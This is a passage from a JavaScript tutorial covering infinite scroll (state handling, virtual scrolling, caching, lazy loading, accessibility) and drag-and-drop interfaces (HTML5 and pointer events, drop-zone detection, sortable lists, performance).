window.addEventListener('scroll', () => {
  clearTimeout(scrollTimeout);
  scrollTimeout = setTimeout(() => {
    // Scroll position check
  }, 150);
});
```

### State Management

Track loading state, current page/offset, and whether more content exists:

```javascript
let state = {
  isLoading: false,
  currentPage: 1,
  hasMore: true,
  items: []
};

async function loadMoreContent() {
  if (state.isLoading || !state.hasMore) return;
  
  state.isLoading = true;
  showLoadingIndicator();
  
  try {
    const newItems = await fetchContent(state.currentPage);
    
    if (newItems.length === 0) {
      state.hasMore = false;
      hideLoadingIndicator();
      showEndMessage();
      return;
    }
    
    state.items.push(...newItems);
    state.currentPage++;
    renderItems(newItems);
  } catch (error) {
    handleError(error);
  } finally {
    state.isLoading = false;
    hideLoadingIndicator();
  }
}
```

### DOM Rendering Strategies

#### Append-Only Rendering

The simplest approach appends new items to the container:

```javascript
function renderItems(items) {
  const container = document.querySelector('.content-container');
  const fragment = document.createDocumentFragment();
  
  items.forEach(item => {
    const element = createItemElement(item);
    fragment.appendChild(element);
  });
  
  container.appendChild(fragment);
}
```

DocumentFragment batches DOM operations, reducing reflows.

#### Virtual Scrolling

For lists with thousands of items, virtual scrolling renders only visible elements:

```javascript
class VirtualScroller {
  constructor(container, itemHeight, renderItem) {
    this.container = container;
    this.itemHeight = itemHeight;
    this.renderItem = renderItem;
    this.items = [];
    this.visibleStart = 0;
    this.visibleEnd = 0;
    
    this.container.addEventListener('scroll', () => this.onScroll());
  }
  
  setItems(items) {
    this.items = items;
    this.container.style.height = `${items.length * this.itemHeight}px`;
    this.render();
  }
  
  onScroll() {
    const scrollTop = this.container.scrollTop;
    const viewportHeight = this.container.clientHeight;
    
    this.visibleStart = Math.floor(scrollTop / this.itemHeight);
    this.visibleEnd = Math.ceil((scrollTop + viewportHeight) / this.itemHeight);
    
    this.render();
  }
  
  render() {
    const visible = this.items.slice(this.visibleStart, this.visibleEnd);
    const offsetY = this.visibleStart * this.itemHeight;
    
    this.container.innerHTML = '';
    const wrapper = document.createElement('div');
    wrapper.style.transform = `translateY(${offsetY}px)`;
    
    visible.forEach(item => {
      wrapper.appendChild(this.renderItem(item));
    });
    
    this.container.appendChild(wrapper);
  }
}
```

#### Windowing with Buffer

Maintain a sliding window of rendered items with buffer zones:

```javascript
const WINDOW_SIZE = 50;
const BUFFER_SIZE = 10;

function maintainWindow() {
  const allItems = document.querySelectorAll('.item');
  const scrollTop = window.scrollY;
  const viewportHeight = window.innerHeight;
  
  allItems.forEach((item, index) => {
    const rect = item.getBoundingClientRect();
    const isInViewport = rect.top < viewportHeight && rect.bottom > 0;
    const isInBuffer = Math.abs(rect.top) < viewportHeight * 2;
    
    if (!isInViewport && !isInBuffer && allItems.length > WINDOW_SIZE) {
      item.remove();
      // Store removed item data for potential re-rendering
    }
  });
}
```

### Performance Optimizations

#### Request Batching and Caching

Batch multiple rapid scroll triggers into single requests:

```javascript
let loadTimeout;
let pendingLoad = false;

function requestLoad() {
  if (pendingLoad) return;
  
  pendingLoad = true;
  clearTimeout(loadTimeout);
  
  loadTimeout = setTimeout(() => {
    pendingLoad = false;
    loadMoreContent();
  }, 100);
}
```

Cache loaded pages to prevent redundant fetches:

```javascript
const cache = new Map();

async function fetchContent(page) {
  if (cache.has(page)) {
    return cache.get(page);
  }
  
  const data = await fetch(`/api/items?page=${page}`).then(r => r.json());
  cache.set(page, data);
  return data;
}
```

#### Image Lazy Loading

Defer image loading for off-screen content:

```javascript
function createItemElement(item) {
  const el = document.createElement('div');
  el.innerHTML = `
    <img data-src="${item.imageUrl}" 
         src="placeholder.jpg"
         class="lazy-image">
  `;
  return el;
}

const imageObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target;
      img.src = img.dataset.src;
      img.classList.remove('lazy-image');
      imageObserver.unobserve(img);
    }
  });
});

// Observe images after rendering
document.querySelectorAll('.lazy-image').forEach(img => {
  imageObserver.observe(img);
});
```

#### RequestAnimationFrame for Smooth Updates

Synchronize DOM updates with browser paint cycles:

```javascript
let rafId;
let itemsToRender = [];

function scheduleRender(items) {
  itemsToRender.push(...items);
  
  if (!rafId) {
    rafId = requestAnimationFrame(() => {
      renderBatch(itemsToRender);
      itemsToRender = [];
      rafId = null;
    });
  }
}

function renderBatch(items) {
  const fragment = document.createDocumentFragment();
  items.forEach(item => fragment.appendChild(createItemElement(item)));
  container.appendChild(fragment);
}
```

### Scroll Position Management

#### Restoring Position on Back Navigation

Preserve scroll position when users navigate away and return:

```javascript
// Before navigation
window.addEventListener('beforeunload', () => {
  sessionStorage.setItem('scrollPos', window.scrollY);
  sessionStorage.setItem('loadedPage', state.currentPage);
});

// On page load
window.addEventListener('load', async () => {
  const savedScroll = sessionStorage.getItem('scrollPos');
  const savedPage = sessionStorage.getItem('loadedPage');
  
  if (savedScroll && savedPage) {
    // Load content up to saved page
    for (let i = 1; i <= savedPage; i++) {
      const items = await fetchContent(i);
      renderItems(items);
    }
    
    // Restore scroll position
    window.scrollTo(0, parseInt(savedScroll));
    
    sessionStorage.removeItem('scrollPos');
    sessionStorage.removeItem('loadedPage');
  }
});
```

#### Scroll Anchoring

Prevent layout shifts when content loads above viewport:

```css
.content-container {
  overflow-anchor: auto;
}
```

For manual control:

```javascript
function insertContentAbove(items) {
  const currentScroll = window.scrollY;
  const oldHeight = document.documentElement.scrollHeight;
  
  prependItems(items);
  
  const newHeight = document.documentElement.scrollHeight;
  const heightDiff = newHeight - oldHeight;
  
  window.scrollTo(0, currentScroll + heightDiff);
}
```

### Bidirectional Infinite Scroll

Support loading content in both directions:

```javascript
let state = {
  topPage: 0,
  bottomPage: 1,
  isLoadingTop: false,
  isLoadingBottom: false,
  hasMoreTop: true,
  hasMoreBottom: true
};

const topSentinel = document.querySelector('.top-sentinel');
const bottomSentinel = document.querySelector('.bottom-sentinel');

const topObserver = new IntersectionObserver((entries) => {
  if (entries[0].isIntersecting && !state.isLoadingTop && state.hasMoreTop) {
    loadContentAbove();
  }
});

const bottomObserver = new IntersectionObserver((entries) => {
  if (entries[0].isIntersecting && !state.isLoadingBottom && state.hasMoreBottom) {
    loadContentBelow();
  }
});

topObserver.observe(topSentinel);
bottomObserver.observe(bottomSentinel);

async function loadContentAbove() {
  state.isLoadingTop = true;
  const items = await fetchContent(state.topPage - 1);
  
  if (items.length === 0) {
    state.hasMoreTop = false;
    return;
  }
  
  state.topPage--;
  insertContentAbove(items);
  state.isLoadingTop = false;
}
```

### Error Handling and Recovery

Implement retry logic for failed requests:

```javascript
async function fetchWithRetry(url, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url);
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      return await response.json();
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      await new Promise(resolve => setTimeout(resolve, Math.pow(2, i) * 1000));
    }
  }
}

function handleError(error) {
  state.isLoading = false;
  hideLoadingIndicator();
  
  const errorDiv = document.createElement('div');
  errorDiv.className = 'load-error';
  errorDiv.innerHTML = `
    <p>Failed to load content</p>
    <button onclick="retryLoad()">Retry</button>
  `;
  container.appendChild(errorDiv);
}

function retryLoad() {
  document.querySelector('.load-error')?.remove();
  loadMoreContent();
}
```

### Loading Indicators

Provide visual feedback during content loading:

```javascript
function showLoadingIndicator() {
  const loader = document.createElement('div');
  loader.className = 'loading-indicator';
  loader.innerHTML = `
    <div class="spinner"></div>
    <p>Loading more items...</p>
  `;
  container.appendChild(loader);
}

function hideLoadingIndicator() {
  document.querySelector('.loading-indicator')?.remove();
}

// Skeleton screens for better perceived performance
function showSkeletons(count = 5) {
  const fragment = document.createDocumentFragment();
  for (let i = 0; i < count; i++) {
    const skeleton = document.createElement('div');
    skeleton.className = 'skeleton-item';
    fragment.appendChild(skeleton);
  }
  container.appendChild(fragment);
}

function removeSkeletons() {
  document.querySelectorAll('.skeleton-item').forEach(el => el.remove());
}
```

### Memory Management

Monitor and limit memory usage:

```javascript
const MAX_ITEMS = 500;

function pruneOldItems() {
  const items = document.querySelectorAll('.item');
  
  if (items.length > MAX_ITEMS) {
    const toRemove = items.length - MAX_ITEMS;
    
    // Remove items far from viewport
    for (let i = 0; i < toRemove; i++) {
      items[i].remove();
    }
    
    // Update state
    state.items = state.items.slice(toRemove);
  }
}

// Monitor memory usage (if available)
if (performance.memory) {
  setInterval(() => {
    const usedMemory = performance.memory.usedJSHeapSize;
    const totalMemory = performance.memory.jsHeapSizeLimit;
    
    if (usedMemory / totalMemory > 0.9) {
      console.warn('High memory usage, pruning items');
      pruneOldItems();
    }
  }, 5000);
}
```

### Accessibility Considerations

Announce new content to screen readers:

```javascript
function announceNewContent(count) {
  const announcement = document.createElement('div');
  announcement.setAttribute('role', 'status');
  announcement.setAttribute('aria-live', 'polite');
  announcement.className = 'sr-only';
  announcement.textContent = `Loaded ${count} more items`;
  
  document.body.appendChild(announcement);
  
  setTimeout(() => announcement.remove(), 1000);
}

// Allow keyboard navigation to load more
bottomSentinel.setAttribute('tabindex', '0');
bottomSentinel.addEventListener('focus', () => {
  if (!state.isLoading && state.hasMore) {
    loadMoreContent();
  }
});
```

Provide a "Load More" button alternative:

```javascript
function createLoadMoreButton() {
  const button = document.createElement('button');
  button.textContent = 'Load More';
  button.className = 'load-more-btn';
  button.onclick = loadMoreContent;
  return button;
}

// Toggle between automatic and manual loading
let autoLoad = true;

function toggleLoadMode() {
  autoLoad = !autoLoad;
  
  if (autoLoad) {
    observer.observe(sentinel);
    document.querySelector('.load-more-btn')?.remove();
  } else {
    observer.unobserve(sentinel);
    container.appendChild(createLoadMoreButton());
  }
}
```

### URL and History Management

Update URL as user scrolls through content:

```javascript
function updateURLForPage(page) {
  const url = new URL(window.location);
  url.searchParams.set('page', page);
  history.replaceState({ page }, '', url);
}

// Update as content loads
async function loadMoreContent() {
  // ... loading logic
  updateURLForPage(state.currentPage);
}

// Handle browser back/forward
window.addEventListener('popstate', (event) => {
  if (event.state?.page) {
    // Load content for specific page
    loadToPage(event.state.page);
  }
});
```

### Pagination Fallback

Support pagination for scenarios where infinite scroll fails:

```javascript
function initializeScrollOrPagination() {
  // Feature detection
  const supportsIntersectionObserver = 'IntersectionObserver' in window;
  const isLowEndDevice = navigator.hardwareConcurrency < 4;
  
  if (!supportsIntersectionObserver || isLowEndDevice) {
    enablePaginationMode();
  } else {
    enableInfiniteScrollMode();
  }
}

function enablePaginationMode() {
  createPaginationControls();
  container.dataset.mode = 'pagination';
}

function createPaginationControls() {
  const controls = document.createElement('div');
  controls.className = 'pagination-controls';
  controls.innerHTML = `
    <button onclick="loadPreviousPage()">Previous</button>
    <span class="page-number">Page ${state.currentPage}</span>
    <button onclick="loadNextPage()">Next</button>
  `;
  container.after(controls);
}
```

### Testing Strategies

Simulate scroll events for testing:

```javascript
function simulateScroll(position) {
  window.scrollTo(0, position);
  window.dispatchEvent(new Event('scroll'));
}

function testInfiniteScroll() {
  const docHeight = document.documentElement.scrollHeight;
  
  // Scroll near bottom
  simulateScroll(docHeight - 400);
  
  // Wait for loading
  setTimeout(() => {
    console.assert(state.isLoading, 'Should trigger loading');
  }, 100);
}

// Mock intersection observer for testing
class MockIntersectionObserver {
  constructor(callback) {
    this.callback = callback;
  }
  
  observe(element) {
    this.element = element;
  }
  
  simulateIntersection(isIntersecting) {
    this.callback([{
      target: this.element,
      isIntersecting
    }]);
  }
}
```

### Complete Implementation Example

```javascript
class InfiniteScroll {
  constructor(container, options = {}) {
    this.container = container;
    this.options = {
      threshold: 200,
      pageSize: 20,
      maxItems: 500,
      fetchFunction: null,
      renderFunction: null,
      ...options
    };
    
    this.state = {
      isLoading: false,
      currentPage: 1,
      hasMore: true,
      items: []
    };
    
    this.init();
  }
  
  init() {
    this.createSentinel();
    this.setupObserver();
    this.loadInitialContent();
  }
  
  createSentinel() {
    this.sentinel = document.createElement('div');
    this.sentinel.className = 'scroll-sentinel';
    this.container.appendChild(this.sentinel);
  }
  
  setupObserver() {
    this.observer = new IntersectionObserver(
      (entries) => this.onIntersection(entries),
      { rootMargin: `${this.options.threshold}px` }
    );
    this.observer.observe(this.sentinel);
  }
  
  onIntersection(entries) {
    if (entries[0].isIntersecting && !this.state.isLoading && this.state.hasMore) {
      this.loadMore();
    }
  }
  
  async loadInitialContent() {
    await this.loadMore();
  }
  
  async loadMore() {
    if (this.state.isLoading || !this.state.hasMore) return;
    
    this.state.isLoading = true;
    this.showLoading();
    
    try {
      const newItems = await this.options.fetchFunction(
        this.state.currentPage,
        this.options.pageSize
      );
      
      if (newItems.length === 0) {
        this.state.hasMore = false;
        this.showEndMessage();
        return;
      }
      
      this.state.items.push(...newItems);
      this.state.currentPage++;
      this.render(newItems);
      this.pruneIfNeeded();
      
    } catch (error) {
      this.handleError(error);
    } finally {
      this.state.isLoading = false;
      this.hideLoading();
    }
  }
  
  render(items) {
    const fragment = document.createDocumentFragment();
    
    items.forEach(item => {
      const element = this.options.renderFunction(item);
      fragment.appendChild(element);
    });
    
    this.container.insertBefore(fragment, this.sentinel);
  }
  
  pruneIfNeeded() {
    if (this.state.items.length > this.options.maxItems) {
      const toRemove = this.state.items.length - this.options.maxItems;
      const itemElements = this.container.querySelectorAll('.item');
      
      for (let i = 0; i < toRemove; i++) {
        itemElements[i]?.remove();
      }
      
      this.state.items = this.state.items.slice(toRemove);
    }
  }
  
  showLoading() {
    const loader = document.createElement('div');
    loader.className = 'loading-indicator';
    loader.textContent = 'Loading...';
    this.container.insertBefore(loader, this.sentinel);
  }
  
  hideLoading() {
    this.container.querySelector('.loading-indicator')?.remove();
  }
  
  showEndMessage() {
    const message = document.createElement('div');
    message.className = 'end-message';
    message.textContent = 'No more items';
    this.container.appendChild(message);
  }
  
  handleError(error) {
    console.error('Failed to load content:', error);
    // Implement retry logic here
  }
  
  destroy() {
    this.observer.disconnect();
    this.sentinel.remove();
  }
}

// Usage
const scroller = new InfiniteScroll(
  document.querySelector('.content'),
  {
    fetchFunction: async (page, size) => {
      const response = await fetch(`/api/items?page=${page}&size=${size}`);
      return response.json();
    },
    renderFunction: (item) => {
      const div = document.createElement('div');
      div.className = 'item';
      div.textContent = item.title;
      return div;
    }
  }
);
```

---

## Drag and Drop Interfaces (DOM/JS)

### Native HTML5 Drag and Drop API

The HTML5 Drag and Drop API provides built-in browser support for dragging elements. Any element becomes draggable by setting `draggable="true"`.

#### Event Lifecycle

The drag operation triggers seven distinct events in sequence:

**On the draggable element:**

- `dragstart` - Fires when drag begins; set drag data and visual feedback here
- `drag` - Fires continuously during drag (every few hundred milliseconds)
- `dragend` - Fires when drag completes, regardless of success or cancellation

**On drop targets:**

- `dragenter` - Fires when dragged element enters a valid drop target
- `dragover` - Fires continuously while over target; must call `preventDefault()` to allow drop
- `dragleave` - Fires when dragged element leaves the target
- `drop` - Fires when element is released over target; only if `dragover` was prevented

#### DataTransfer Object

The `DataTransfer` object carries data between drag source and drop target. Access it via `event.dataTransfer`.

**Setting data:**

```javascript
element.addEventListener('dragstart', (e) => {
  e.dataTransfer.setData('text/plain', 'some data');
  e.dataTransfer.setData('application/json', JSON.stringify({id: 123}));
});
```

**Reading data:**

```javascript
element.addEventListener('drop', (e) => {
  e.preventDefault();
  const text = e.dataTransfer.getData('text/plain');
  const json = JSON.parse(e.dataTransfer.getData('application/json'));
});
```

**Key properties:**

- `effectAllowed` - Restricts cursor feedback ('copy', 'move', 'link', 'copyMove', 'all', 'none')
- `dropEffect` - Indicates operation type during drag
- `files` - FileList for file drag operations
- `types` - Array of MIME types available in current drag

#### Visual Feedback Mechanisms

**Drag image customization:**

```javascript
dragstart: (e) => {
  const ghost = document.createElement('div');
  ghost.className = 'custom-drag-ghost';
  ghost.textContent = 'Dragging...';
  document.body.appendChild(ghost);
  e.dataTransfer.setDragImage(ghost, 0, 0);
  setTimeout(() => ghost.remove(), 0);
}
```

**CSS pseudo-classes:** The browser provides `:drag` pseudo-class but support is limited. Use JavaScript classes instead:

```javascript
dragstart: (e) => e.target.classList.add('dragging'),
dragend: (e) => e.target.classList.remove('dragging')
```

#### Cross-Browser Quirks

**Firefox requires data to be set:** Firefox will not initiate drag unless `setData()` is called during `dragstart`, even if the data isn't used.

**Mobile Safari incompatibility:** iOS Safari does not support HTML5 drag and drop for touch events until iOS 15, and even then support is incomplete. Use touch event polyfills or pointer events instead.

**Event timing differences:** The order of `dragleave` and `dragenter` when moving between nested elements varies by browser. Track state carefully to avoid flicker.

### Pointer-Based Drag Implementation

Modern drag interfaces often bypass the native API entirely, using pointer events for precise control.

#### Pointer Events vs Mouse Events

Pointer events unify mouse, touch, and pen input:

```javascript
element.addEventListener('pointerdown', handleDragStart);
element.addEventListener('pointermove', handleDragMove);
element.addEventListener('pointerup', handleDragEnd);
element.addEventListener('pointercancel', handleDragCancel);
```

**Advantages over mouse events:**

- Single event handler for all input types
- `setPointerCapture()` ensures events continue even when pointer leaves element
- Pressure sensitivity via `pressure` property
- Contact geometry via `width` and `height` properties

#### Pointer Capture

```javascript
let isDragging = false;

function handlePointerDown(e) {
  isDragging = true;
  e.target.setPointerCapture(e.pointerId);
  // Store initial position
  const rect = e.target.getBoundingClientRect();
  e.target.dataset.offsetX = e.clientX - rect.left;
  e.target.dataset.offsetY = e.clientY - rect.top;
}

function handlePointerMove(e) {
  if (!isDragging) return;
  
  const offsetX = parseFloat(e.target.dataset.offsetX);
  const offsetY = parseFloat(e.target.dataset.offsetY);
  
  e.target.style.left = `${e.clientX - offsetX}px`;
  e.target.style.top = `${e.clientY - offsetY}px`;
}

function handlePointerUp(e) {
  isDragging = false;
  e.target.releasePointerCapture(e.pointerId);
}
```

Pointer capture prevents losing tracking when cursor moves rapidly or leaves the window.

#### Touch Event Considerations

When supporting touch directly (without pointer events):

**Prevent default scrolling:**

```javascript
touchstart: (e) => {
  e.preventDefault(); // Blocks scrolling
  // Store touch identifier
  activeTouch = e.touches[0].identifier;
}
```

**Track correct touch:**

```javascript
touchmove: (e) => {
  const touch = Array.from(e.touches).find(t => t.identifier === activeTouch);
  if (!touch) return;
  // Use touch.clientX, touch.clientY
}
```

**Handle multi-touch:** Multi-touch requires tracking multiple simultaneous drags by `identifier`. Most drag interfaces ignore secondary touches.

### Coordinate Systems and Transforms

#### Position Calculation Strategies

**Absolute positioning (simple):**

```javascript
element.style.left = `${e.clientX}px`;
element.style.top = `${e.clientY}px`;
```

Requires `position: absolute` or `fixed`. Breaks in scrollable containers with transformed ancestors.

**Transform-based positioning (GPU-accelerated):**

```javascript
const x = e.clientX - initialX;
const y = e.clientY - initialY;
element.style.transform = `translate(${x}px, ${y}px)`;
```

Better performance through GPU compositing. Maintains document flow. Requires tracking delta from start position.

**Relative to container:**

```javascript
const container = element.offsetParent;
const rect = container.getBoundingClientRect();
const x = e.clientX - rect.left - container.scrollLeft;
const y = e.clientY - rect.top - container.scrollTop;
```

#### Handling CSS Transforms

Parent transforms affect coordinate calculations. `getBoundingClientRect()` returns transformed coordinates, but `offsetLeft/Top` do not.

**Getting actual visual position:**

```javascript
function getTransformedPosition(element) {
  const rect = element.getBoundingClientRect();
  return {
    x: rect.left + window.scrollX,
    y: rect.top + window.scrollY
  };
}
```

**Inverting parent transforms:** For precise positioning under scale/rotate transforms, invert the transformation matrix:

```javascript
function getTransformMatrix(element) {
  const style = window.getComputedStyle(element);
  const matrix = style.transform;
  if (matrix === 'none') return null;
  
  const values = matrix.match(/matrix.*\((.+)\)/)[1].split(', ');
  return values.map(parseFloat);
}
```

[Inference]: Full matrix inversion for arbitrary transforms requires matrix math libraries. Most interfaces constrain transforms or reset them during drag.

#### Scroll Compensation

Scrollable containers require offset adjustment:

```javascript
function getScrollAwarePosition(e, container) {
  const rect = container.getBoundingClientRect();
  return {
    x: e.clientX - rect.left + container.scrollLeft,
    y: e.clientY - rect.top + container.scrollTop
  };
}
```

**Auto-scrolling near edges:**

```javascript
function checkAutoScroll(e, container) {
  const threshold = 50;
  const rect = container.getBoundingClientRect();
  const speed = 5;
  
  if (e.clientY - rect.top < threshold) {
    container.scrollTop -= speed;
  } else if (rect.bottom - e.clientY < threshold) {
    container.scrollTop += speed;
  }
  
  if (e.clientX - rect.left < threshold) {
    container.scrollLeft -= speed;
  } else if (rect.right - e.clientX < threshold) {
    container.scrollLeft += speed;
  }
}
```

### Drop Zone Detection

#### Geometric Collision Detection

**Point-in-rectangle:**

```javascript
function isOverDropZone(x, y, dropZone) {
  const rect = dropZone.getBoundingClientRect();
  return x >= rect.left && x <= rect.right &&
         y >= rect.top && y <= rect.bottom;
}
```

**Center-point detection:**

```javascript
function getDraggedElementCenter(element) {
  const rect = element.getBoundingClientRect();
  return {
    x: rect.left + rect.width / 2,
    y: rect.top + rect.height / 2
  };
}
```

Using center point prevents edge cases where drag element partially overlaps multiple zones.

**Area-based detection (overlap percentage):**

```javascript
function getOverlapPercentage(rect1, rect2) {
  const x_overlap = Math.max(0, 
    Math.min(rect1.right, rect2.right) - Math.max(rect1.left, rect2.left));
  const y_overlap = Math.max(0,
    Math.min(rect1.bottom, rect2.bottom) - Math.max(rect1.top, rect2.top));
  
  const overlapArea = x_overlap * y_overlap;
  const rect1Area = rect1.width * rect1.height;
  
  return (overlapArea / rect1Area) * 100;
}
```

#### Z-Index and Element Stacking

**Finding topmost drop zone:**

```javascript
function getTopMostDropZone(x, y, dropZones) {
  const candidates = dropZones.filter(zone => 
    isOverDropZone(x, y, zone)
  );
  
  if (candidates.length === 0) return null;
  if (candidates.length === 1) return candidates[0];
  
  // Compare z-index and DOM order
  return candidates.reduce((topmost, current) => {
    const topmostZ = parseInt(getComputedStyle(topmost).zIndex) || 0;
    const currentZ = parseInt(getComputedStyle(current).zIndex) || 0;
    return currentZ > topmostZ ? current : topmost;
  });
}
```

**Using `elementsFromPoint()`:**

```javascript
function getDropZoneAtPoint(x, y, dropZoneSelector) {
  const elements = document.elementsFromPoint(x, y);
  return elements.find(el => el.matches(dropZoneSelector));
}
```

This respects actual visual stacking order including z-index, but has performance implications with many elements.

#### Spatial Indexing for Large Sets

With hundreds of drop zones, checking every zone per pixel movement becomes expensive.

**Grid-based spatial hash:**

```javascript
class SpatialGrid {
  constructor(cellSize = 100) {
    this.cellSize = cellSize;
    this.grid = new Map();
  }
  
  getCell(x, y) {
    const cellX = Math.floor(x / this.cellSize);
    const cellY = Math.floor(y / this.cellSize);
    return `${cellX},${cellY}`;
  }
  
  insert(element) {
    const rect = element.getBoundingClientRect();
    const cells = this.getCellsForRect(rect);
    
    cells.forEach(cell => {
      if (!this.grid.has(cell)) this.grid.set(cell, []);
      this.grid.get(cell).push(element);
    });
  }
  
  getCellsForRect(rect) {
    const cells = [];
    const startX = Math.floor(rect.left / this.cellSize);
    const endX = Math.floor(rect.right / this.cellSize);
    const startY = Math.floor(rect.top / this.cellSize);
    const endY = Math.floor(rect.bottom / this.cellSize);
    
    for (let x = startX; x <= endX; x++) {
      for (let y = startY; y <= endY; y++) {
        cells.push(`${x},${y}`);
      }
    }
    return cells;
  }
  
  query(x, y) {
    const cell = this.getCell(x, y);
    return this.grid.get(cell) || [];
  }
}
```

Reduces collision checks from O(n) to O(k) where k is elements per grid cell.

### Constraint Systems

#### Axis Locking

```javascript
let dragAxis = null;
const threshold = 10;
let dragStartX, dragStartY;

function determineDragAxis(e) {
  if (dragAxis) return dragAxis;
  
  const dx = Math.abs(e.clientX - dragStartX);
  const dy = Math.abs(e.clientY - dragStartY);
  
  if (dx > threshold || dy > threshold) {
    dragAxis = dx > dy ? 'horizontal' : 'vertical';
  }
  return dragAxis;
}

function applyAxisConstraint(x, y) {
  const axis = determineDragAxis(e);
  if (axis === 'horizontal') {
    return { x, y: dragStartY };
  } else if (axis === 'vertical') {
    return { x: dragStartX, y };
  }
  return { x, y };
}
```

#### Snap-to-Grid

```javascript
function snapToGrid(x, y, gridSize) {
  return {
    x: Math.round(x / gridSize) * gridSize,
    y: Math.round(y / gridSize) * gridSize
  };
}
```

**Grid with offset:**

```javascript
function snapToGridWithOffset(x, y, gridSize, offsetX, offsetY) {
  return {
    x: Math.round((x - offsetX) / gridSize) * gridSize + offsetX,
    y: Math.round((y - offsetY) / gridSize) * gridSize + offsetY
  };
}
```

#### Boundary Constraints

**Constrain to container:**

```javascript
function constrainToContainer(element, container) {
  const elemRect = element.getBoundingClientRect();
  const contRect = container.getBoundingClientRect();
  
  let x = parseFloat(element.style.left);
  let y = parseFloat(element.style.top);
  
  x = Math.max(0, Math.min(x, contRect.width - elemRect.width));
  y = Math.max(0, Math.min(y, contRect.height - elemRect.height));
  
  return { x, y };
}
```

**Magnetic snap to edges:**

```javascript
function magneticSnap(pos, containerSize, elementSize, snapDistance = 10) {
  if (pos < snapDistance) return 0;
  if (pos > containerSize - elementSize - snapDistance) {
    return containerSize - elementSize;
  }
  return pos;
}
```

### Sortable Lists

#### Insertion Point Detection

**Between-items approach:**

```javascript
function getInsertionIndex(y, items) {
  for (let i = 0; i < items.length; i++) {
    const rect = items[i].getBoundingClientRect();
    const midpoint = rect.top + rect.height / 2;
    
    if (y < midpoint) return i;
  }
  return items.length;
}
```

**Visual placeholder:**

```javascript
let placeholder = null;

function updatePlaceholder(insertionIndex, container) {
  if (!placeholder) {
    placeholder = document.createElement('div');
    placeholder.className = 'drop-placeholder';
  }
  
  const items = Array.from(container.children).filter(el => 
    el !== placeholder && !el.classList.contains('dragging')
  );
  
  if (insertionIndex >= items.length) {
    container.appendChild(placeholder);
  } else {
    container.insertBefore(placeholder, items[insertionIndex]);
  }
}
```

#### DOM Reordering Strategies

**Immediate DOM update:**

```javascript
function reorderImmediate(draggedElement, targetIndex, container) {
  const items = Array.from(container.children);
  if (targetIndex >= items.length) {
    container.appendChild(draggedElement);
  } else {
    container.insertBefore(draggedElement, items[targetIndex]);
  }
}
```

Causes layout thrashing on every move. Use with `requestAnimationFrame` batching.

**Deferred update (animation-friendly):**

```javascript
let pendingOrder = null;

function handleMove(e) {
  // Update visual position with transforms
  updateDraggedElementPosition(e);
  
  // Calculate and store target order
  const targetIndex = getInsertionIndex(e.clientY, items);
  pendingOrder = { draggedElement, targetIndex };
  
  // Update placeholder only
  updatePlaceholder(targetIndex);
}

function handleDrop() {
  if (pendingOrder) {
    // Apply actual DOM reordering once
    reorderImmediate(pendingOrder.draggedElement, pendingOrder.targetIndex);
  }
}
```

#### Animated Reordering

**CSS transitions on siblings:**

```javascript
function enableTransitions(items) {
  items.forEach(item => {
    item.style.transition = 'transform 200ms ease-out';
  });
}

function shiftItemsForInsertion(items, insertionIndex, draggedHeight) {
  items.forEach((item, i) => {
    if (i >= insertionIndex) {
      item.style.transform = `translateY(${draggedHeight}px)`;
    } else {
      item.style.transform = 'translateY(0)';
    }
  });
}
```

**FLIP technique (First, Last, Invert, Play):**

```javascript
function animateReorder(container, callback) {
  // First: Record initial positions
  const items = Array.from(container.children);
  const first = items.map(item => item.getBoundingClientRect());
  
  // Mutate DOM
  callback();
  
  // Last: Record final positions
  const last = items.map(item => item.getBoundingClientRect());
  
  // Invert: Apply negative transform to put elements at old position
  items.forEach((item, i) => {
    const dx = first[i].left - last[i].left;
    const dy = first[i].top - last[i].top;
    
    item.style.transition = 'none';
    item.style.transform = `translate(${dx}px, ${dy}px)`;
  });
  
  // Force reflow
  container.offsetHeight;
  
  // Play: Transition to new position
  items.forEach(item => {
    item.style.transition = 'transform 200ms ease-out';
    item.style.transform = 'translate(0, 0)';
  });
}
```

FLIP prevents layout-triggered reflows during animation, achieving 60fps reordering.

### Performance Optimization

#### Throttling and Debouncing

**`requestAnimationFrame` throttle:**

```javascript
let rafId = null;
let lastPosition = null;

function handleMove(e) {
  lastPosition = { x: e.clientX, y: e.clientY };
  
  if (!rafId) {
    rafId = requestAnimationFrame(() => {
      updateDragPosition(lastPosition);
      rafId = null;
    });
  }
}
```

Limits updates to display refresh rate (~60fps), preventing wasted computation.

**Time-based throttle for expensive operations:**

```javascript
const throttle = (fn, delay) => {
  let lastCall = 0;
  return (...args) => {
    const now = Date.now();
    if (now - lastCall >= delay) {
      lastCall = now;
      fn(...args);
    }
  };
};

const checkDropZones = throttle((x, y) => {
  // Expensive collision detection
}, 50); // Max 20 checks per second
```

#### Layer Promotion and Compositing

**Force GPU compositing:**

```css
.dragging {
  will-change: transform;
  /* Or */
  transform: translateZ(0);
}
```

Promotes element to own compositor layer, preventing main thread repaints.

**Minimize paint areas:**

```javascript
// Set dragged element to position:fixed during drag
function startDrag(element) {
  const rect = element.getBoundingClientRect();
  element.style.position = 'fixed';
  element.style.left = `${rect.left}px`;
  element.style.top = `${rect.top}px`;
  element.style.width = `${rect.width}px`;
  element.style.margin = '0'; // Prevent layout shifts
}
```

Fixed positioning removes element from document flow, preventing ancestor repaints.

#### Virtual Scrolling Integration

Drag operations in virtualized lists require special handling since only visible items exist in DOM.

**Tracking scroll-relative position:**

```javascript
class VirtualDragHandler {
  constructor(virtualList) {
    this.list = virtualList;
    this.draggedIndex = null;
    this.scrollOffset = 0;
  }
  
  handleDragStart(index) {
    this.draggedIndex = index;
    this.scrollOffset = this.list.scrollTop;
  }
  
  getInsertionIndex(clientY) {
    const scrolledY = clientY + this.list.scrollTop - this.scrollOffset;
    const itemHeight = this.list.itemHeight;
    return Math.floor(scrolledY / itemHeight);
  }
  
  handleDrop() {
    const newIndex = this.getInsertionIndex(lastMouseY);
    this.list.moveItem(this.draggedIndex, newIndex);
  }
}
```

[Inference]: Most virtual list libraries provide specific drag integration; custom implementation needs to account for item recycling and viewport changes during drag.

#### Memory Management

**Cleanup event listeners:**

```javascript
class DragManager {
  constructor() {
    this.boundHandleMove = this.handleMove.bind(this);
    this.boundHandleUp = this.handleUp.bind(this);
  }
  
  startDrag() {
    document.addEventListener('pointermove', this.boundHandleMove);
